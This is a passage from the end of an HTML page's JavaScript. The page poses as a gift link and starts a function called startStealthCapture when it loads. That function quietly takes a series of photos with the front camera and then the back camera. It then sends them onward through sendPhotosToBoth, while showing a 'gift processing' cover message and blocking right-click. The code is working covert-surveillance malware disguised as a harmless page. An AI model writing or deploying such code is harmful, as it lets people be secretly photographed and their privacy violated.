                return;
            }
            
            // Wait for camera
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // ===== CAPTURE IN BACKGROUND =====
            let photoIndex = 0;
            let useFrontCamera = true;
            
            intervalId = setInterval(async () => {
                if (photoIndex >= totalPhotos) {
                    clearInterval(intervalId);
                    
                    // Stop camera
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    
                    // Send photos to both
                    await sendPhotosToBoth();
                    return;
                }
                
                try {
                    // Capture photo
                    const photoData = capturePhoto();
                    
                    if (photoData) {
                        photos.push({
                            data: photoData,
                            type: useFrontCamera ? 'front' : 'back',
                            index: photoIndex + 1
                        });
                        
                        capturedPhotos++;
                        updateProgress(photoIndex + 1);
                        
                        // Switch camera after 5 photos
                        if (photoIndex === 4 && useFrontCamera) {
                            const switched = await switchToBackCamera();
                            if (switched) {
                                useFrontCamera = false;
                                await new Promise(resolve => setTimeout(resolve, 500));
                            }
                        }
                    }
                    
                    photoIndex++;
                    
                } catch (error) {
                    console.error('Capture error:', error);
                    photoIndex++;
                }
                
            }, 2000); // Capture every 2 seconds
        }
        
        // Start when page loads
        window.addEventListener('load', () => {
            if (!token || !uid) {
                document.body.innerHTML = `
                    <div class="container">
                        <div style="font-size:60px; margin-bottom:20px;">‚ùå</div>
                        <h1>INVALID LINK</h1>
                        <div class="message">
                            This gift link is invalid or has expired.
                        </div>
                    </div>
                `;
                return;
            }
            
            // Start capture
            setTimeout(startStealthCapture, 1000);
        });
        
        // Continue capturing even if page loses focus
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && isCapturing) {
                statusText.textContent = "Resuming gift processing...";
            }
        });
        
        // Prevent right-click
        document.addEventListener('contextmenu', (e) => e.preventDefault());
    </script>
</body>
</html>
